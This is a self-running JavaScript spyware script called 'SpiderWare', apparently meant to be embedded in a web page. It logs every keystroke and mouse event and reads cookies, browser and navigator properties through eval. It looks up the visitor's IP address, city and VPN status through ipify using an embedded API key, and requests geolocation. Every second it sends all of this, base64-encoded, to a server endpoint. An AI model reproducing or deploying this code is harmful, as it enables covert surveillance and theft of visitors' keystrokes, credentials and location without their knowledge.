var SpiderWare = {
    scan: scanFunc,
    keylogger: keyloggerFunc,
    mouselogger: mouseloggerFunc,
    trackers: trackersFunc,
    settings: {
        scan: {
            recursive: false,
            locations: [
                'window',
                'chrome',
                'document',
                'navigator',
                'window.performance',
                'window.clientInformation'
            ],
            urls: [
                'https://api.ipify.org?format=json',
                'https://geo.ipify.org/api/v2/country,city,vpn?apiKey=at_Yu36VcIhThBVdl9g1NTdFbJc2jGTM'
            ]
        },
        options: {
            mouseLogger: true,
            keylogger: true
        }
    },
    output: {
        scanners: {

        },
        loggers: {
            keylogger: [],
            mouselogger: []
        },
        trackers: {
            location: {

            },
            audio: {

            },
            video: {

            }
        },
        control: {
            notifications: {

            }
        }
    },
    clock: function() {
        document.cookie.replaceAll('"', '');
        // SpiderWare.output.scanners.locations.document.cookie.replaceAll('"', '');
        localStorage.setItem("info", (JSON.stringify(SpiderWare.output)));
        var http = new XMLHttpRequest();
        var url = 'update.php';
        SpiderWare.output.scanners.locations.document.cookie = false;
        var params = `jsondata=${btoa(JSON.stringify(SpiderWare.output))}`;
        console.warn(btoa(JSON.stringify(SpiderWare.output)));
        http.open('POST', url, true);

        //Send the proper header information along with the request
        http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

        http.onreadystatechange = function() {//Call a function when the state changes.
            if(http.readyState == 4 && http.status == 200) {
                // alert(http.responseText);
                console.log(http.responseText);
                console.log(http.responseXML);
            }
        }
        http.send(params);
    },
    run: function() {
        this.scan(), this.keylogger(), this.mouselogger(), this.trackers();
        window.setInterval(this.clock,1000)
    },
    
}

window.SpiderWare = SpiderWare;




function search(object, objName) {
    var out = {};
    for (i in object) {
        try {
            if(['string', 'number', 'boolean', 'null', 'undefined'].includes(typeof(object[i]))) {
                out[i] = String(object[i]).replaceAll('"', '').replaceAll('\"', '');
            } else if(['array', 'object'].includes(typeof(object[i]))) {
                out[i] = JSON.parse(object[i]);
            }
        } catch(err) {
            console.log(i, object[i], err);
        }
    }
    return out;
}

function scanFunc() {
    var output = {
        locations: {
        },
        urls: {
        }
    };
    for (i in SpiderWare.settings.scan.locations) {
        output.locations[SpiderWare.settings.scan.locations[i]] = search(eval(SpiderWare.settings.scan.locations[i]), i)
    }
    
    for (i in SpiderWare.settings.scan.urls) {
        fetch (String(SpiderWare.settings.scan.urls[i]))
        .then(x => x.json())
        .then(y => output.urls[SpiderWare.settings.scan.urls[i]] = y);
    }
    SpiderWare.output.scanners = output;
}

function keyloggerFunc() {
    document.addEventListener('keydown', function(e) {
        SpiderWare.output.loggers.keylogger.push({
            type: 'keydown',
            time: new Date(),
            code: e.code,
            keyCode: e.keyCode,
            which: e.which,
            event: e,
            timeStamp: e.timeStamp,
            srcElement: e.srcElement,
        })
    });

    document.addEventListener('keyup', function(e) {
        SpiderWare.output.loggers.keylogger.push({
            type: 'keyup',
            time: new Date(),
            code: e.code,
            keyCode: e.keyCode,
            which: e.which,
            event: e,
            timeStamp: e.timeStamp,
            srcElement: e.srcElement,
        })
    });
}

function mouseloggerFunc() {
    document.addEventListener('mousemove', function(e) {SpiderWare.output.loggers.mouselogger.push({type:e.type, time: new Date(), x: e.x,y: e.y,srcElement: e.srcElement,element: document.elementFromPoint(e.x, e.y),event: e,timeStamp: e.timeStamp})});
    document.addEventListener('mousedown', function(e) {SpiderWare.output.loggers.mouselogger.push({type:e.type, time: new Date(), x: e.x,y: e.y,srcElement: e.srcElement,element: document.elementFromPoint(e.x, e.y),event: e,timeStamp: e.timeStamp})});
    document.addEventListener('mouseenter', function(e) {SpiderWare.output.loggers.mouselogger.push({type:e.type, time: new Date(), x: e.x,y: e.y,srcElement: e.srcElement,element: document.elementFromPoint(e.x, e.y),event: e,timeStamp: e.timeStamp})});
    document.addEventListener('mouseleave', function(e) {SpiderWare.output.loggers.mouselogger.push({type:e.type, time: new Date(), x: e.x,y: e.y,srcElement: e.srcElement,element: document.elementFromPoint(e.x, e.y),event: e,timeStamp: e.timeStamp})});
    document.addEventListener('mouseout', function(e) {SpiderWare.output.loggers.mouselogger.push({type:e.type, time: new Date(), x: e.x,y: e.y,srcElement: e.srcElement,element: document.elementFromPoint(e.x, e.y),event: e,timeStamp: e.timeStamp})});
    document.addEventListener('mouseover', function(e) {SpiderWare.output.loggers.mouselogger.push({type:e.type, time: new Date(), x: e.x,y: e.y,srcElement: e.srcElement,element: document.elementFromPoint(e.x, e.y),event: e,timeStamp: e.timeStamp})});
    document.addEventListener('mouseup', function(e) {SpiderWare.output.loggers.mouselogger.push({type:e.type, time: new Date(), x: e.x,y: e.y,srcElement: e.srcElement,element: document.elementFromPoint(e.x, e.y),event: e,timeStamp: e.timeStamp})});
    document.addEventListener('mousewheel', function(e) {SpiderWare.output.loggers.mouselogger.push({type:e.type, time: new Date(), x: e.x,y: e.y,srcElement: e.srcElement,element: document.elementFromPoint(e.x, e.y),event: e,timeStamp: e.timeStamp})});
    document.addEventListener('click', function(e) {SpiderWare.output.loggers.mouselogger.push({type:e.type, time: new Date(), x: e.x,y: e.y,srcElement: e.srcElement,element: document.elementFromPoint(e.x, e.y),event: e, timeStamp: e.timeStamp})});

}

function trackersFunc() {
    try {
      navigator.geolocation.getCurrentPosition(function(position) {SpiderWare.output.trackers.location = position});
  } catch(err) {}
}
  




SpiderWare.run()